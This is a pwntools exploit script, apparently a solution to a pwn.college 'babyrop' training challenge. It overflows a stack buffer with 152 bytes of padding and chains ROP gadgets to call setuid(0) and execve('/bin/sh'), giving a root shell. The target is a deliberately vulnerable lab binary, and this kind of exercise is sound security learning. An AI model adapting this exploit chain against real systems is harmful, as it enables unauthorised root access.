from pwn import *

context.arch='amd64'
context.os='linux'

FILE = "/challenge/babyrop_level4.0"
HOST = 'pwn.college'
username = 'hacker'
password = ''''''

port = 22


# Load the binary
context.binary = '/home/darkstar/Downloads/temp'
elf = context.binary

context.terminal = ['tmux', 'splitw', '-h']
#conn = ssh(user=username, host=HOST, password=password, port=port)

p = process('/home/darkstar/Downloads/temp')
#p = conn.process(FILE)
#gdb.attach(p, '''
#    break *challenge+419
#    continue
#''')
# Leak the address of the input buffer
p.recvuntil(b'[LEAK] Your input buffer is located at: ')
input_buffer_addr = int(p.recvline().strip()[:-1], 16)

# Calculate the address of /bin/sh in the input buffer
padding_size = 152  # Overwrite the return address
bin_sh_addr = input_buffer_addr # + padding_size + rop_chain_size  # Address of "/bin/sh" string
print(hex(bin_sh_addr))
# Create the ROP chain
rop = ROP(elf)

# Find the necessary gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])
pop_rax = rop.find_gadget(['pop rax', 'ret'])
syscall = rop.find_gadget(['syscall'])  # Address of the syscall gadget

#call setuid
rop.raw(pop_rdi)
rop.raw(0)              # Argument for setuid (0 = root)
rop.raw(pop_rax)
rop.raw(105)            # Syscall number for setuid
rop.raw(syscall)  

# Set up the ROP chain to call execve("/bin/sh", 0, 0)
rop.raw(pop_rdi)
rop.raw(bin_sh_addr)  # Address of "/bin/sh" string
rop.raw(pop_rsi)
rop.raw(0)            # argv = NULL
rop.raw(pop_rdx)
rop.raw(0)            # envp = NULL
rop.raw(pop_rax)
rop.raw(59)           # Syscall number for execve
rop.raw(syscall)      # Invoke syscall

print("ROP Chain:")
print(rop.dump())

# Send the payload
payload = b'/bin/sh\x00'      # Append "/bin/sh" string
payload += b'A' * (padding_size - len(payload))  # Fill the buffer up to the return address
payload += rop.chain()         # Append the ROP chain

hex_payload = ''.join(f'\\x{byte:02x}' for byte in payload)
print("Payload in hexadecimal:")
print(hex_payload)

p.sendline(payload)

# Interact with the shell
p.interactive()

#conn.close()
